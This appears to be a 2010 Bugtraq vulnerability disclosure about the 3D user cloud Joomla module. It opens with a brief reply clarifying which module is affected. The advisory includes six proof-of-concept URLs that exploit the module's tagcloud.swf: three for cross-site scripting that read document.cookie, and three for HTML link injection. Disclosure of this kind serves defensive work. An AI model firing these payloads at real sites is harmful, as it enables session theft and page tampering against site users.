Hello JoomlaJabber!

> I believe this is now resolved.....

You confused it with Joomla module 3D Cloud (mod_3dcloud). Which I wrote
about at my site and reported to Bugtraq at January.

3D Cloud developers didn't answer me, so I don't know fixed it or not, but
in this advisory I talked about another Joomla module. I wrote about module
3D user cloud for Joomla (mod_democbusr3dcloud, mod_cbusr3dcloud and
mod_usr3dcloud). It's commercial module with three versions - one free (demo
version) and two paid ones. And the hole in 3D user cloud module (in all its
versions) is still not fixed.

Hello Bugtraq!

I want to warn you about security vulnerability in module 3D user cloud for
Joomla.

-----------------------------
Advisory: Vulnerability in 3D user cloud for Joomla
-----------------------------
URL: http://websecurity.com.ua/4198/
-----------------------------
Affected product: all versions of 3D user cloud (mod_democbusr3dcloud,
mod_cbusr3dcloud and mod_usr3dcloud) for Joomla.
-----------------------------
Timeline:

10.05.2010 - found vulnerability.
14.05.2010 - disclosed at my site.
15.05.2010 - informed developers.
-----------------------------
Details:

This is Cross-Site Scripting vulnerability.

This XSS is similar to XSS vulnerability in WP-Cumulus and other web
applications which I already reported to security mailing lists, because
it's using tagcloud.swf made by author of WP-Cumulus. About millions of
flash files tagcloud.swf which are vulnerable to XSS attacks I mentioned in
my article XSS vulnerabilities in 34 millions flash files
(http://www.webappsec.org/lists/websecurity/archive/2010-01/msg00035.html).

There are three version of the module: mod_democbusr3dcloud (demo version)
and mod_cbusr3dcloud and mod_usr3dcloud (full versions). Flash files are
tagcloud.swf and tagcloud_rus.swf.

XSS:

http://site/modules/mod_democbusr3dcloud/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

http://site/modules/mod_cbusr3dcloud/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

http://site/modules/mod_usr3dcloud/tagcloud_rus.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

Code will execute after click. It's strictly social XSS.

Also it's possible to conduct (like in WP-Cumulus) HTML Injection attack,
including in those flash files which have protection (in flash files or via
WAF) against javascript and vbscript URI in parameter tagcloud.

HTML Injection:

http://site/modules/mod_democbusr3dcloud/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='http://websecurity.com.ua'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

http://site/modules/mod_cbusr3dcloud/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='http://websecurity.com.ua'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

http://site/modules/mod_usr3dcloud/tagcloud_rus.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='http://websecurity.com.ua'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E
